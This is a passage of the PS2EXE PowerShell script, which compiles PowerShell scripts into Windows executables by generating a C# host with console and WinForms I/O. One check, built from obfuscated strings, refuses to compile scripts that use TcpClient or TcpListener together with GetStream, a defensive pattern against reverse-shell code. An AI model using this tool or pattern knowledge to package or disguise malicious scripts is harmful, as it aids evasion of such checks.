	Write-Error "-supportOS cannot be combined with -virtualize"
	exit -1
}
if ($longPaths -and $virtualize)
{
	Write-Error "-longPaths cannot be combined with -virtualize"
	exit -1
}

if ($runtime20 -and $runtime40)
{
	Write-Error "You cannot use switches -runtime20 and -runtime40 at the same time!"
	exit -1
}

if (!$runtime20 -and !$runtime40)
{
	if ($psversion -eq 4)
	{
		$runtime40 = $TRUE
	}
}


$CFGFILE = $FALSE
if ($configFile)
{ $CFGFILE = $TRUE
	if ($noConfigFile)
	{
		Write-Error "-configFile cannot be combined with -noConfigFile"
		exit -1
	}
}
if (!$CFGFILE -and $longPaths)
{
	Write-Warning "Forcing generation of a config file, since the option -longPaths requires this"
	$CFGFILE = $TRUE
}

if ($STA -and $MTA)
{
	Write-Error "You cannot use switches -STA and -MTA at the same time!"
	exit -1
}



if ($psversion -ge 3 -and !$MTA -and !$STA)
{
	# Set default apartment mode for powershell version if not set by parameter
	$STA = $TRUE
}

# escape escape sequences in version info
$title = $title -replace "\\", "\\"
$product = $product -replace "\\", "\\"
$copyright = $copyright -replace "\\", "\\"
$trademark = $trademark -replace "\\", "\\"
$description = $description -replace "\\", "\\"
$company = $company -replace "\\", "\\"

if (![STRING]::IsNullOrEmpty($version))
{ # check for correct version number information
	if ($version -notmatch "(^\d+\.\d+\.\d+\.\d+$)|(^\d+\.\d+\.\d+$)|(^\d+\.\d+$)|(^\d+$)")
	{
		Write-Error "Version number has to be supplied in the form n.n.n.n, n.n.n, n.n or n (with n as number)!"
		exit -1
	}
}

Write-Output ""

$type = ('System.Collections.Generic.Dictionary`2') -as "Type"
$type = $type.MakeGenericType( @( ("System.String" -as "Type"), ("system.string" -as "Type") ) )
$o = [Activator]::CreateInstance($type)

$compiler20 = $FALSE
if ($psversion -eq 3 -or $psversion -eq 4)
{
	$o.Add("CompilerVersion", "v4.0")
}

$referenceAssembies = @("System.dll")
if (!$noConsole)
{
	if ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "Microsoft.PowerShell.ConsoleHost.dll" })
	{
		$referenceAssembies += ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "Microsoft.PowerShell.ConsoleHost.dll" } | Select-Object -First 1).Location
	}
}
$referenceAssembies += ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Management.Automation.dll" } | Select-Object -First 1).Location

if ($runtime40)
{
	$n = New-Object System.Reflection.AssemblyName("System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
	[System.AppDomain]::CurrentDomain.Load($n) | Out-Null
	$referenceAssembies += ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Core.dll" } | Select-Object -First 1).Location
}

if ($noConsole)
{
	$n = New-Object System.Reflection.AssemblyName("System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
	if ($runtime40)
	{
		$n = New-Object System.Reflection.AssemblyName("System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
	}
	[System.AppDomain]::CurrentDomain.Load($n) | Out-Null

	$n = New-Object System.Reflection.AssemblyName("System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")
	if ($runtime40)
	{
		$n = New-Object System.Reflection.AssemblyName("System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")
	}
	[System.AppDomain]::CurrentDomain.Load($n) | Out-Null

	$referenceAssembies += ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Windows.Forms.dll" } | Select-Object -First 1).Location
	$referenceAssembies += ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Drawing.dll" } | Select-Object -First 1).Location
}

$platform = "anycpu"
if ($x64 -and !$x86) { $platform = "x64" } else { if ($x86 -and !$x64) { $platform = "x86" }}

$cop = (New-Object Microsoft.CSharp.CSharpCodeProvider($o))
$cp = New-Object System.CodeDom.Compiler.CompilerParameters($referenceAssembies, $outputFile)
$cp.GenerateInMemory = $FALSE
$cp.GenerateExecutable = $TRUE

$iconFileParam = ""
if (!([STRING]::IsNullOrEmpty($iconFile)))
{
	$iconFileParam = "`"/win32icon:$($iconFile)`""
}

$manifestParam = ""
if ($requireAdmin -or $DPIAware -or $supportOS -or $longPaths)
{
	$manifestParam = "`"/win32manifest:$($outputFile+".win32manifest")`""
	$win32manifest = "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>`r`n<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">`r`n"
	if ($DPIAware -or $longPaths)
	{
		$win32manifest += "<application xmlns=""urn:schemas-microsoft-com:asm.v3"">`r`n<windowsSettings>`r`n"
		if ($DPIAware)
		{
			$win32manifest += "<dpiAware xmlns=""http://schemas.microsoft.com/SMI/2005/WindowsSettings"">true</dpiAware>`r`n<dpiAwareness xmlns=""http://schemas.microsoft.com/SMI/2016/WindowsSettings"">PerMonitorV2</dpiAwareness>`r`n"
		}
		if ($longPaths)
		{
			$win32manifest += "<longPathAware xmlns=""http://schemas.microsoft.com/SMI/2016/WindowsSettings"">true</longPathAware>`r`n"
		}
		$win32manifest += "</windowsSettings>`r`n</application>`r`n"
	}
	if ($requireAdmin)
	{
		$win32manifest += "<trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">`r`n<security>`r`n<requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">`r`n<requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false""/>`r`n</requestedPrivileges>`r`n</security>`r`n</trustInfo>`r`n"
	}
	if ($supportOS)
	{
		$win32manifest += "<compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">`r`n<application>`r`n<supportedOS Id=""{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}""/>`r`n<supportedOS Id=""{1f676c76-80e1-4239-95bb-83d0f6d0da78}""/>`r`n<supportedOS Id=""{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}""/>`r`n<supportedOS Id=""{35138b9a-5d96-4fbd-8e2d-a2440225f93a}""/>`r`n<supportedOS Id=""{e2011457-1546-43c5-a5fe-008deee3d3f0}""/>`r`n</application>`r`n</compatibility>`r`n"
	}
	$win32manifest += "</assembly>"
	$win32manifest | Set-Content ($outputFile+".win32manifest") -Encoding UTF8
}

if (!$virtualize)
{ $cp.CompilerOptions = "/platform:$($platform) /target:$( if ($noConsole){'winexe'}else{'exe'}) $($iconFileParam) $($manifestParam)" }
else
{
	Write-Output "Application virtualization is activated, forcing x86 platfom."
	$cp.CompilerOptions = "/platform:x86 /target:$( if ($noConsole) { 'winexe' } else { 'exe' } ) /nowin32manifest $($iconFileParam)"
}

$cp.IncludeDebugInformation = $prepareDebug

if ($prepareDebug)
{
	$cp.TempFiles.KeepFiles = $TRUE
}

Write-Output "Reading input file $inputFile"
$content = Get-Content -LiteralPath $inputFile -Encoding UTF8 -ErrorAction SilentlyContinue
if ([STRING]::IsNullOrEmpty($content))
{
	Write-Error "No data found. May be read error or file protected."
	exit -2
}
if (($content -match ("Tck12U8wnt" -replace "k12U8w", "pClie") -or ($content -match ("TU2q9ener" -replace "U2q9", "cpList")) -and ($content -match ("GA2E3qeam" -replace "A2E3q", "etStr"))))
{
	Write-Error "Compile was denied because PS2EXE is not intended to generate malware." -Category ParserError -ErrorId RuntimeException
	exit -2
}
$scriptInp = [STRING]::Join("`r`n", $content)
$script = [System.Convert]::ToBase64String(([System.Text.Encoding]::UTF8.GetBytes($scriptInp)))

$culture = ""

if ($lcid)
{
	$culture = @"
	System.Threading.Thread.CurrentThread.CurrentCulture = System.Globalization.CultureInfo.GetCultureInfo($lcid);
	System.Threading.Thread.CurrentThread.CurrentUICulture = System.Globalization.CultureInfo.GetCultureInfo($lcid);
"@
}

$programFrame = @"
// Simple PowerShell host created by Ingo Karstein (http://blog.karstein-consulting.com)
// Reworked and GUI support by Markus Scholtes

using System;
using System.Collections.Generic;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Globalization;
using System.Management.Automation.Host;
using System.Security;
using System.Reflection;
using System.Runtime.InteropServices;
$(if ($noConsole) {@"
using System.Windows.Forms;
using System.Drawing;
"@ })

[assembly:AssemblyTitle("$title")]
[assembly:AssemblyProduct("$product")]
[assembly:AssemblyCopyright("$copyright")]
[assembly:AssemblyTrademark("$trademark")]
$(if (![STRING]::IsNullOrEmpty($version)) {@"
[assembly:AssemblyVersion("$version")]
[assembly:AssemblyFileVersion("$version")]
"@ })
// not displayed in details tab of properties dialog, but embedded to file
[assembly:AssemblyDescription("$description")]
[assembly:AssemblyCompany("$company")]

namespace ModuleNameSpace
{
$(if ($noConsole -or $credentialGUI) {@"
	internal class Credential_Form
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CREDUI_INFO
		{
			public int cbSize;
			public IntPtr hwndParent;
			public string pszMessageText;
			public string pszCaptionText;
			public IntPtr hbmBanner;
		}

		[Flags]
		enum CREDUI_FLAGS
		{
			INCORRECT_PASSWORD = 0x1,
			DO_NOT_PERSIST = 0x2,
			REQUEST_ADMINISTRATOR = 0x4,
			EXCLUDE_CERTIFICATES = 0x8,
			REQUIRE_CERTIFICATE = 0x10,
			SHOW_SAVE_CHECK_BOX = 0x40,
			ALWAYS_SHOW_UI = 0x80,
			REQUIRE_SMARTCARD = 0x100,
			PASSWORD_ONLY_OK = 0x200,
			VALIDATE_USERNAME = 0x400,
			COMPLETE_USERNAME = 0x800,
			PERSIST = 0x1000,
			SERVER_CREDENTIAL = 0x4000,
			EXPECT_CONFIRMATION = 0x20000,
			GENERIC_CREDENTIALS = 0x40000,
			USERNAME_TARGET_CREDENTIALS = 0x80000,
			KEEP_USERNAME = 0x100000,
		}

		public enum CredUI_ReturnCodes
		{
			NO_ERROR = 0,
			ERROR_CANCELLED = 1223,
			ERROR_NO_SUCH_LOGON_SESSION = 1312,
			ERROR_NOT_FOUND = 1168,
			ERROR_INVALID_ACCOUNT_NAME = 1315,
			ERROR_INSUFFICIENT_BUFFER = 122,
			ERROR_INVALID_PARAMETER = 87,
			ERROR_INVALID_FLAGS = 1004,
		}

		[DllImport("credui", CharSet = CharSet.Unicode)]
		private static extern CredUI_ReturnCodes CredUIPromptForCredentials(ref CREDUI_INFO credinfo,
			string targetName,
			IntPtr reserved1,
			int iError,
			StringBuilder userName,
			int maxUserName,
			StringBuilder password,
			int maxPassword,
			[MarshalAs(UnmanagedType.Bool)] ref bool pfSave,
			CREDUI_FLAGS flags);

		public class User_Pwd
		{
			public string User = string.Empty;
			public string Password = string.Empty;
			public string Domain = string.Empty;
		}

		internal static User_Pwd PromptForPassword(string caption, string message, string target, string user, PSCredentialTypes credTypes, PSCredentialUIOptions options)
		{
			// Flags und Variablen initialisieren
			StringBuilder userPassword = new StringBuilder("", 128), userID = new StringBuilder(user, 128);
			CREDUI_INFO credUI = new CREDUI_INFO();
			if (!string.IsNullOrEmpty(message)) credUI.pszMessageText = message;
			if (!string.IsNullOrEmpty(caption)) credUI.pszCaptionText = caption;
			credUI.cbSize = Marshal.SizeOf(credUI);
			bool save = false;

			CREDUI_FLAGS flags = CREDUI_FLAGS.DO_NOT_PERSIST;
			if ((credTypes & PSCredentialTypes.Generic) == PSCredentialTypes.Generic)
			{
				flags |= CREDUI_FLAGS.GENERIC_CREDENTIALS;
				if ((options & PSCredentialUIOptions.AlwaysPrompt) == PSCredentialUIOptions.AlwaysPrompt)
				{
					flags |= CREDUI_FLAGS.ALWAYS_SHOW_UI;
				}
			}

			// den Benutzer nach Kennwort fragen, grafischer Prompt
			CredUI_ReturnCodes returnCode = CredUIPromptForCredentials(ref credUI, target, IntPtr.Zero, 0, userID, 128, userPassword, 128, ref save, flags);

			if (returnCode == CredUI_ReturnCodes.NO_ERROR)
			{
				User_Pwd ret = new User_Pwd();
				ret.User = userID.ToString();
				ret.Password = userPassword.ToString();
				ret.Domain = "";
				return ret;
			}

			return null;
		}
	}
"@ })

	internal class MainModuleRawUI : PSHostRawUserInterface
	{
$(if ($noConsole){ @"
		// Speicher für Konsolenfarben bei GUI-Output werden gelesen und gesetzt, aber im Moment nicht genutzt (for future use)
		private ConsoleColor GUIBackgroundColor = ConsoleColor.White;
		private ConsoleColor GUIForegroundColor = ConsoleColor.Black;
"@ } else {@"
		const int STD_OUTPUT_HANDLE = -11;

		//CHAR_INFO struct, which was a union in the old days
		// so we want to use LayoutKind.Explicit to mimic it as closely
		// as we can
		[StructLayout(LayoutKind.Explicit)]
		public struct CHAR_INFO
		{
			[FieldOffset(0)]
			internal char UnicodeChar;
			[FieldOffset(0)]
			internal char AsciiChar;
			[FieldOffset(2)] //2 bytes seems to work properly
			internal UInt16 Attributes;
		}

		//COORD struct
		[StructLayout(LayoutKind.Sequential)]
		public struct COORD
		{
			public short X;
			public short Y;
		}

		//SMALL_RECT struct
		[StructLayout(LayoutKind.Sequential)]
		public struct SMALL_RECT
		{
			public short Left;
			public short Top;
			public short Right;
			public short Bottom;
		}

		/* Reads character and color attribute data from a rectangular block of character cells in a console screen buffer,
			 and the function writes the data to a rectangular block at a specified location in the destination buffer. */
		[DllImport("kernel32.dll", EntryPoint = "ReadConsoleOutputW", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern bool ReadConsoleOutput(
			IntPtr hConsoleOutput,
			/* This pointer is treated as the origin of a two-dimensional array of CHAR_INFO structures
			whose size is specified by the dwBufferSize parameter.*/
			[MarshalAs(UnmanagedType.LPArray), Out] CHAR_INFO[,] lpBuffer,
			COORD dwBufferSize,
			COORD dwBufferCoord,
			ref SMALL_RECT lpReadRegion);

		/* Writes character and color attribute data to a specified rectangular block of character cells in a console screen buffer.
			The data to be written is taken from a correspondingly sized rectangular block at a specified location in the source buffer */
		[DllImport("kernel32.dll", EntryPoint = "WriteConsoleOutputW", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern bool WriteConsoleOutput(
			IntPtr hConsoleOutput,
			/* This pointer is treated as the origin of a two-dimensional array of CHAR_INFO structures
			whose size is specified by the dwBufferSize parameter.*/
			[MarshalAs(UnmanagedType.LPArray), In] CHAR_INFO[,] lpBuffer,
			COORD dwBufferSize,
			COORD dwBufferCoord,
			ref SMALL_RECT lpWriteRegion);

		/* Moves a block of data in a screen buffer. The effects of the move can be limited by specifying a clipping rectangle, so
			the contents of the console screen buffer outside the clipping rectangle are unchanged. */
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool ScrollConsoleScreenBuffer(
			IntPtr hConsoleOutput,
			[In] ref SMALL_RECT lpScrollRectangle,
			[In] ref SMALL_RECT lpClipRectangle,
			COORD dwDestinationOrigin,
			[In] ref CHAR_INFO lpFill);

		[DllImport("kernel32.dll", SetLastError = true)]
			static extern IntPtr GetStdHandle(int nStdHandle);
"@ })

		public override ConsoleColor BackgroundColor
		{
$(if (!$noConsole){ @"
			get
			{
				return Console.BackgroundColor;
			}
			set
			{
				Console.BackgroundColor = value;
			}
"@ } else {@"
			get
			{
				return GUIBackgroundColor;
			}
			set
			{
				GUIBackgroundColor = value;
			}
"@ })
		}

		public override System.Management.Automation.Host.Size BufferSize
		{
			get
			{
$(if (!$noConsole){ @"
				if (Console_Info.IsOutputRedirected())
					// return default value for redirection. If no valid value is returned WriteLine will not be called
					return new System.Management.Automation.Host.Size(120, 50);
				else
					return new System.Management.Automation.Host.Size(Console.BufferWidth, Console.BufferHeight);
"@ } else {@"
					// return default value for Winforms. If no valid value is returned WriteLine will not be called
				return new System.Management.Automation.Host.Size(120, 50);
"@ })
			}
			set
			{
$(if (!$noConsole){ @"
				Console.BufferWidth = value.Width;
				Console.BufferHeight = value.Height;
"@ })
			}
		}

		public override Coordinates CursorPosition
		{
			get
			{
$(if (!$noConsole){ @"
				return new Coordinates(Console.CursorLeft, Console.CursorTop);
"@ } else {@"
				// Dummywert für Winforms zurückgeben.
				return new Coordinates(0, 0);
"@ })
			}
			set
			{
$(if (!$noConsole){ @"
				Console.CursorTop = value.Y;
				Console.CursorLeft = value.X;
"@ })
			}
		}

		public override int CursorSize
		{
			get
			{
$(if (!$noConsole){ @"
				return Console.CursorSize;
"@ } else {@"
				// Dummywert für Winforms zurückgeben.
				return 25;
"@ })
			}
			set
			{
$(if (!$noConsole){ @"
				Console.CursorSize = value;
"@ })
			}
		}

$(if ($noConsole){ @"
		private Form Invisible_Form = null;
"@ })

		public override void FlushInputBuffer()
		{
$(if (!$noConsole){ @"
			if (!Console_Info.IsInputRedirected())
			{	while (Console.KeyAvailable)
					Console.ReadKey(true);
			}
"@ } else {@"
			if (Invisible_Form != null)
			{
				Invisible_Form.Close();
				Invisible_Form = null;
			}
			else
			{
				Invisible_Form = new Form();
				Invisible_Form.Opacity = 0;
				Invisible_Form.ShowInTaskbar = false;
				Invisible_Form.Visible = true;
			}
"@ })
		}

		public override ConsoleColor ForegroundColor
		{
$(if (!$noConsole){ @"
			get
			{
				return Console.ForegroundColor;
			}
			set
			{
				Console.ForegroundColor = value;
			}
"@ } else {@"
			get
			{
				return GUIForegroundColor;
			}
			set
			{
				GUIForegroundColor = value;
			}
"@ })
		}

		public override BufferCell[,] GetBufferContents(System.Management.Automation.Host.Rectangle rectangle)
		{
$(if ($compiler20) {@"
			throw new Exception("Method GetBufferContents not implemented for .Net V2.0 compiler");
"@ } else { if (!$noConsole) {@"
			IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
			CHAR_INFO[,] buffer = new CHAR_INFO[rectangle.Bottom - rectangle.Top + 1, rectangle.Right - rectangle.Left + 1];
			COORD buffer_size = new COORD() {X = (short)(rectangle.Right - rectangle.Left + 1), Y = (short)(rectangle.Bottom - rectangle.Top + 1)};
			COORD buffer_index = new COORD() {X = 0, Y = 0};
			SMALL_RECT screen_rect = new SMALL_RECT() {Left = (short)rectangle.Left, Top = (short)rectangle.Top, Right = (short)rectangle.Right, Bottom = (short)rectangle.Bottom};

			ReadConsoleOutput(hStdOut, buffer, buffer_size, buffer_index, ref screen_rect);

			System.Management.Automation.Host.BufferCell[,] ScreenBuffer = new System.Management.Automation.Host.BufferCell[rectangle.Bottom - rectangle.Top + 1, rectangle.Right - rectangle.Left + 1];
			for (int y = 0; y <= rectangle.Bottom - rectangle.Top; y++)
				for (int x = 0; x <= rectangle.Right - rectangle.Left; x++)
				{
					ScreenBuffer[y,x] = new System.Management.Automation.Host.BufferCell(buffer[y,x].AsciiChar, (System.ConsoleColor)(buffer[y,x].Attributes & 0xF), (System.ConsoleColor)((buffer[y,x].Attributes & 0xF0) / 0x10), System.Management.Automation.Host.BufferCellType.Complete);
				}

			return ScreenBuffer;
"@ } else {@"
			System.Management.Automation.Host.BufferCell[,] ScreenBuffer = new System.Management.Automation.Host.BufferCell[rectangle.Bottom - rectangle.Top + 1, rectangle.Right - rectangle.Left + 1];

			for (int y = 0; y <= rectangle.Bottom - rectangle.Top; y++)
				for (int x = 0; x <= rectangle.Right - rectangle.Left; x++)
				{
					ScreenBuffer[y,x] = new System.Management.Automation.Host.BufferCell(' ', GUIForegroundColor, GUIBackgroundColor, System.Management.Automation.Host.BufferCellType.Complete);
				}

			return ScreenBuffer;
"@ } })
		}

		public override bool KeyAvailable
		{
			get
			{
$(if (!$noConsole) {@"
				return Console.KeyAvailable;
"@ } else {@"
				return true;
"@ })
			}
		}

		public override System.Management.Automation.Host.Size MaxPhysicalWindowSize
		{
			get
			{
$(if (!$noConsole){ @"
				return new System.Management.Automation.Host.Size(Console.LargestWindowWidth, Console.LargestWindowHeight);
"@ } else {@"
				// Dummy-Wert für Winforms
				return new System.Management.Automation.Host.Size(240, 84);
"@ })
			}
		}

		public override System.Management.Automation.Host.Size MaxWindowSize
		{
			get
			{
$(if (!$noConsole){ @"
				return new System.Management.Automation.Host.Size(Console.BufferWidth, Console.BufferWidth);
"@ } else {@"
				// Dummy-Wert für Winforms
				return new System.Management.Automation.Host.Size(120, 84);
"@ })
			}
		}

		public override KeyInfo ReadKey(ReadKeyOptions options)
		{
$(if (!$noConsole) {@"
			ConsoleKeyInfo cki = Console.ReadKey((options & ReadKeyOptions.NoEcho)!=0);

			ControlKeyStates cks = 0;
			if ((cki.Modifiers & ConsoleModifiers.Alt) != 0)
				cks |= ControlKeyStates.LeftAltPressed | ControlKeyStates.RightAltPressed;
			if ((cki.Modifiers & ConsoleModifiers.Control) != 0)
				cks |= ControlKeyStates.LeftCtrlPressed | ControlKeyStates.RightCtrlPressed;
			if ((cki.Modifiers & ConsoleModifiers.Shift) != 0)
				cks |= ControlKeyStates.ShiftPressed;
			if (Console.CapsLock)
				cks |= ControlKeyStates.CapsLockOn;
			if (Console.NumberLock)
				cks |= ControlKeyStates.NumLockOn;

			return new KeyInfo((int)cki.Key, cki.KeyChar, cks, (options & ReadKeyOptions.IncludeKeyDown)!=0);
"@ } else {@"
			if ((options & ReadKeyOptions.IncludeKeyDown)!=0)
				return ReadKey_Box.Show("", "", true);
			else
				return ReadKey_Box.Show("", "", false);
"@ })
		}

		public override void ScrollBufferContents(System.Management.Automation.Host.Rectangle source, Coordinates destination, System.Management.Automation.Host.Rectangle clip, BufferCell fill)
		{ // no destination block clipping implemented
$(if (!$noConsole) { if ($compiler20) {@"
			throw new Exception("Method ScrollBufferContents not implemented for .Net V2.0 compiler");
"@ } else {@"
			// clip area out of source range?
			if ((source.Left > clip.Right) || (source.Right < clip.Left) || (source.Top > clip.Bottom) || (source.Bottom < clip.Top))
			{ // clipping out of range -> nothing to do
				return;
			}

			IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
			SMALL_RECT lpScrollRectangle = new SMALL_RECT() {Left = (short)source.Left, Top = (short)source.Top, Right = (short)(source.Right), Bottom = (short)(source.Bottom)};
			SMALL_RECT lpClipRectangle;
			if (clip != null)
			{ lpClipRectangle = new SMALL_RECT() {Left = (short)clip.Left, Top = (short)clip.Top, Right = (short)(clip.Right), Bottom = (short)(clip.Bottom)}; }
			else
			{ lpClipRectangle = new SMALL_RECT() {Left = (short)0, Top = (short)0, Right = (short)(Console.WindowWidth - 1), Bottom = (short)(Console.WindowHeight - 1)}; }
			COORD dwDestinationOrigin = new COORD() {X = (short)(destination.X), Y = (short)(destination.Y)};
			CHAR_INFO lpFill = new CHAR_INFO() { AsciiChar = fill.Character, Attributes = (ushort)((int)(fill.ForegroundColor) + (int)(fill.BackgroundColor)*16) };

			ScrollConsoleScreenBuffer(hStdOut, ref lpScrollRectangle, ref lpClipRectangle, dwDestinationOrigin, ref lpFill);
"@ } })
		}

		public override void SetBufferContents(System.Management.Automation.Host.Rectangle rectangle, BufferCell fill)
		{
$(if (!$noConsole){ @"
			// using a trick: move the buffer out of the screen, the source area gets filled with the char fill.Character
			if (rectangle.Left >= 0)
				Console.MoveBufferArea(rectangle.Left, rectangle.Top, rectangle.Right-rectangle.Left+1, rectangle.Bottom-rectangle.Top+1, BufferSize.Width, BufferSize.Height, fill.Character, fill.ForegroundColor, fill.BackgroundColor);
			else
			{ // Clear-Host: move all content off the screen
				Console.MoveBufferArea(0, 0, BufferSize.Width, BufferSize.Height, BufferSize.Width, BufferSize.Height, fill.Character, fill.ForegroundColor, fill.BackgroundColor);
			}
"@ })
		}

		public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
		{
$(if (!$noConsole) { if ($compiler20) {@"
			throw new Exception("Method SetBufferContents not implemented for .Net V2.0 compiler");
"@ } else {@"
			IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
			CHAR_INFO[,] buffer = new CHAR_INFO[contents.GetLength(0), contents.GetLength(1)];
			COORD buffer_size = new COORD() {X = (short)(contents.GetLength(1)), Y = (short)(contents.GetLength(0))};
			COORD buffer_index = new COORD() {X = 0, Y = 0};
			SMALL_RECT screen_rect = new SMALL_RECT() {Left = (short)origin.X, Top = (short)origin.Y, Right = (short)(origin.X + contents.GetLength(1) - 1), Bottom = (short)(origin.Y + contents.GetLength(0) - 1)};

			for (int y = 0; y < contents.GetLength(0); y++)
				for (int x = 0; x < contents.GetLength(1); x++)
				{
					buffer[y,x] = new CHAR_INFO() { AsciiChar = contents[y,x].Character, Attributes = (ushort)((int)(contents[y,x].ForegroundColor) + (int)(contents[y,x].BackgroundColor)*16) };
				}

			WriteConsoleOutput(hStdOut, buffer, buffer_size, buffer_index, ref screen_rect);
"@ } })
		}

		public override Coordinates WindowPosition
		{
			get
			{
				Coordinates s = new Coordinates();
$(if (!$noConsole){ @"
				s.X = Console.WindowLeft;
				s.Y = Console.WindowTop;
"@ } else {@"
				// Dummy-Wert für Winforms
				s.X = 0;
				s.Y = 0;
"@ })
				return s;
			}
			set
			{
$(if (!$noConsole){ @"
				Console.WindowLeft = value.X;
				Console.WindowTop = value.Y;
"@ })
			}
		}

		public override System.Management.Automation.Host.Size WindowSize
		{
			get
			{
				System.Management.Automation.Host.Size s = new System.Management.Automation.Host.Size();
$(if (!$noConsole){ @"
				s.Height = Console.WindowHeight;
				s.Width = Console.WindowWidth;
"@ } else {@"
				// Dummy-Wert für Winforms
				s.Height = 50;
				s.Width = 120;
"@ })
				return s;
			}
			set
			{
$(if (!$noConsole){ @"
				Console.WindowWidth = value.Width;
				Console.WindowHeight = value.Height;
"@ })
			}
		}

		public override string WindowTitle
		{
			get
			{
$(if (!$noConsole){ @"
				return Console.Title;
"@ } else {@"
				return System.AppDomain.CurrentDomain.FriendlyName;
"@ })
			}
			set
			{
$(if (!$noConsole){ @"
				Console.Title = value;
"@ })
			}
		}
	}

$(if ($noConsole){ @"
	public class Input_Box
	{
		[DllImport("user32.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
		private static extern IntPtr MB_GetString(uint strId);

		public static DialogResult Show(string strTitle, string strPrompt, ref string strVal, bool blSecure)
		{
			// Generate controls
			Form form = new Form();
			form.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			form.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			Label label = new Label();
			TextBox textBox = new TextBox();
			Button buttonOk = new Button();
			Button buttonCancel = new Button();

			// Sizes and positions are defined according to the label
			// This control has to be finished first
			if (string.IsNullOrEmpty(strPrompt))
			{
				if (blSecure)
					label.Text = "Secure input:   ";
				else
					label.Text = "Input:          ";
			}
			else
				label.Text = strPrompt;
			label.Location = new Point(9, 19);
			label.MaximumSize = new System.Drawing.Size(System.Windows.Forms.Screen.FromControl(form).Bounds.Width*5/8 - 18, 0);
			label.AutoSize = true;
			// Size of the label is defined not before Add()
			form.Controls.Add(label);

			// Generate textbox
			if (blSecure) textBox.UseSystemPasswordChar = true;
			textBox.Text = strVal;
			textBox.SetBounds(12, label.Bottom, label.Right - 12, 20);

			// Generate buttons
			// get localized "OK"-string
			string sTextOK = Marshal.PtrToStringUni(MB_GetString(0));
			if (string.IsNullOrEmpty(sTextOK))
				buttonOk.Text = "OK";
			else
				buttonOk.Text = sTextOK;

			// get localized "Cancel"-string
			string sTextCancel = Marshal.PtrToStringUni(MB_GetString(1));
			if (string.IsNullOrEmpty(sTextCancel))
				buttonCancel.Text = "Cancel";
			else
				buttonCancel.Text = sTextCancel;

			buttonOk.DialogResult = DialogResult.OK;
			buttonCancel.DialogResult = DialogResult.Cancel;
			buttonOk.SetBounds(System.Math.Max(12, label.Right - 158), label.Bottom + 36, 75, 23);
			buttonCancel.SetBounds(System.Math.Max(93, label.Right - 77), label.Bottom + 36, 75, 23);

			// Configure form
			if (string.IsNullOrEmpty(strTitle))
				form.Text = System.AppDomain.CurrentDomain.FriendlyName;
			else
				form.Text = strTitle;
			form.ClientSize = new System.Drawing.Size(System.Math.Max(178, label.Right + 10), label.Bottom + 71);
			form.Controls.AddRange(new Control[] { textBox, buttonOk, buttonCancel });
			form.FormBorderStyle = FormBorderStyle.FixedDialog;
			form.StartPosition = FormStartPosition.CenterScreen;
			try {
				form.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
			}
			catch
			{ }
			form.MinimizeBox = false;
			form.MaximizeBox = false;
			form.AcceptButton = buttonOk;
			form.CancelButton = buttonCancel;

			// Show form and compute results
			DialogResult dialogResult = form.ShowDialog();
			strVal = textBox.Text;
			return dialogResult;
		}

		public static DialogResult Show(string strTitle, string strPrompt, ref string strVal)
		{
			return Show(strTitle, strPrompt, ref strVal, false);
		}
	}

	public class Choice_Box
	{
		public static int Show(System.Collections.ObjectModel.Collection<ChoiceDescription> arrChoice, int intDefault, string strTitle, string strPrompt)
		{
			// cancel if array is empty
			if (arrChoice == null) return -1;
			if (arrChoice.Count < 1) return -1;

			// Generate controls
			Form form = new Form();
			form.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			form.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			RadioButton[] aradioButton = new RadioButton[arrChoice.Count];
			ToolTip toolTip = new ToolTip();
			Button buttonOk = new Button();

			// Sizes and positions are defined according to the label
			// This control has to be finished first when a prompt is available
			int iPosY = 19, iMaxX = 0;
			if (!string.IsNullOrEmpty(strPrompt))
			{
				Label label = new Label();
				label.Text = strPrompt;
				label.Location = new Point(9, 19);
				label.MaximumSize = new System.Drawing.Size(System.Windows.Forms.Screen.FromControl(form).Bounds.Width*5/8 - 18, 0);
				label.AutoSize = true;
				// erst durch Add() wird die Größe des Labels ermittelt
				form.Controls.Add(label);
				iPosY = label.Bottom;
				iMaxX = label.Right;
			}

			// An den Radiobuttons orientieren sich die weiteren Größen und Positionen
